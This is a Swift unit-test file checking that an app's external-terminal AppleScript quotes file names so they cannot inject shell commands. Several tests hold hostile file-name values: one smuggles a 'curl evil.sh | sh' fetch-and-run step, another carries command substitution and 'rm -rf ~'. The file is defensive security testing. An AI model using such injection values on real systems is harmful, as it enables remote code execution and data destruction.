// ABOUTME: Tests the shell command ExternalTerminal's production script builds.
// ABOUTME: Runs the real script's command handler, so the assertions cannot drift from it.

@testable import Atelier
import XCTest

/// Exercises `ExternalTerminal.runScript`'s **own** command handler rather than
/// a copy of its logic, so nothing here can keep passing after the script
/// changes. The handler only computes a string — the `tell application
/// "Terminal"` handler beside it is never invoked, so no window opens and no
/// automation permission is needed.
final class ExternalTerminalTests: XCTestCase {
    private func command(_ executable: String, _ file: String) throws -> String {
        try XCTUnwrap(AppleScriptRunner.run(
            source: ExternalTerminal.runScript,
            handler: ExternalTerminal.commandHandler,
            arguments: [executable, file]
        ))
    }

    func testOrdinaryPathsAreQuoted() throws {
        XCTAssertEqual(
            try command("/opt/homebrew/bin/nvim", "/repo/src/main.swift"),
            "'/opt/homebrew/bin/nvim' '/repo/src/main.swift'"
        )
    }

    func testSpacesAreContainedByTheQuoting() throws {
        XCTAssertEqual(
            try command("/bin/nvim", "/repo/my file.txt"),
            "'/bin/nvim' '/repo/my file.txt'"
        )
    }

    // MARK: - Adversarial file names

    func testTheExploitNameBecomesOneQuotedArgument() throws {
        // The original defect: this name closed the AppleScript literal and the
        // rest was run as a second `do script`. It must now be a single shell
        // word with no `do script` of its own.
        let name = #"/repo/x"; do script "curl evil.sh | sh"#
        XCTAssertEqual(try command("/bin/nvim", name), "'/bin/nvim' '\(name)'")
    }

    func testDoubleQuoteStaysInsideTheArgument() throws {
        XCTAssertEqual(try command("/bin/nvim", #"/repo/say"hi"#), #"'/bin/nvim' '/repo/say"hi'"#)
    }

    func testSingleQuoteIsClosedAndReopened() throws {
        // POSIX has no escape inside single quotes, so the quoting has to
        // break out and back in: it'\''s
        XCTAssertEqual(
            try command("/bin/nvim", "/repo/it's"),
            #"'/bin/nvim' '/repo/it'\''s'"#
        )
    }

    func testBackslashIsLiteralInsideTheQuoting() throws {
        XCTAssertEqual(
            try command("/bin/nvim", #"/repo/back\slash"#),
            #"'/bin/nvim' '/repo/back\slash'"#
        )
    }

    func testNewlineStaysInsideTheArgument() throws {
        // Unquoted this would be a command separator; a repository may legally
        // hold a file whose name contains one.
        XCTAssertEqual(
            try command("/bin/nvim", "/repo/two\nlines"),
            "'/bin/nvim' '/repo/two\nlines'"
        )
    }

    func testShellMetacharactersAreInert() throws {
        let name = "/repo/$(touch /tmp/pwned)`id`;rm -rf ~"
        XCTAssertEqual(try command("/bin/nvim", name), "'/bin/nvim' '\(name)'")
    }

    func testANameCombiningEveryCaseIsOneArgument() throws {
        let name = "/repo/all\"of\\them\nand'more"
        XCTAssertEqual(
            try command("/bin/nvim", name),
            "'/bin/nvim' '/repo/all\"of\\them\nand'\\''more'"
        )
    }

    func testTheExecutablePathIsQuotedToo() throws {
        XCTAssertEqual(
            try command("/opt/my tools/nvim", "/repo/a.txt"),
            "'/opt/my tools/nvim' '/repo/a.txt'"
        )
    }

    // MARK: - What a shell actually does with the result

    /// Runs the built command with `/bin/echo` standing in for the editor and
    /// returns what it printed.
    ///
    /// The string equality tests above assert the quoting this code produces;
    /// this asserts what a *shell* then does with it, which is the fact that
    /// actually matters. `echo` joins its arguments with a space, so a name
    /// that came back unchanged reached the editor as exactly one argument.
    /// Nothing here is an editor and nothing opens a window.
    private func echoed(_ file: String) throws -> String {
        let process = Process()
        process.executableURL = URL(fileURLWithPath: "/bin/sh")
        process.arguments = try ["-c", command("/bin/echo", file)]
        let pipe = Pipe()
        process.standardOutput = pipe
        try process.run()
        let data = pipe.fileHandleForReading.readDataToEndOfFile()
        process.waitUntilExit()
        // `echo` adds a trailing newline of its own.
        return String(String(decoding: data, as: UTF8.self).dropLast())
    }

    func testTheExploitNameReachesTheEditorAsOneArgument() throws {
        let name = #"/repo/x"; do script "curl evil.sh | sh"#
        XCTAssertEqual(try echoed(name), name)
    }

    func testCommandSubstitutionInANameIsNeverRun() throws {
        let marker = FileManager.default.temporaryDirectory
            .appendingPathComponent("atelier-externalterminal-\(UUID().uuidString)")
        defer { try? FileManager.default.removeItem(at: marker) }

        let name = "/repo/$(touch \(marker.path))" + "`touch \(marker.path)`"
        XCTAssertEqual(try echoed(name), name)
        XCTAssertFalse(
            FileManager.default.fileExists(atPath: marker.path),
            "a file name's command substitution was executed by the shell"
        )
    }

    func testEveryAdversarialCharacterSurvivesTheShell() throws {
        let names = [
            "/repo/say\"hi",
            "/repo/it's",
            "/repo/back\\slash",
            "/repo/two\nlines",
            "/repo/all\"of\\them\nand'more",
            "/repo/semi;colon && pipe | glob *",
        ]
        for name in names {
            XCTAssertEqual(try echoed(name), name, name.debugDescription)
        }
    }

    // MARK: - The source itself

    func testTheScriptSourceCarriesNoCallerData() {
        // The whole point: the source is a constant. If a future change starts
        // interpolating a path into it, the two handlers are no longer the only
        // thing it declares.
        XCTAssertTrue(ExternalTerminal.runScript.contains("quoted form of"))
        XCTAssertTrue(ExternalTerminal.runScript.contains("on \(ExternalTerminal.runHandler)("))
        XCTAssertTrue(ExternalTerminal.runScript.contains("on \(ExternalTerminal.commandHandler)("))
    }
}
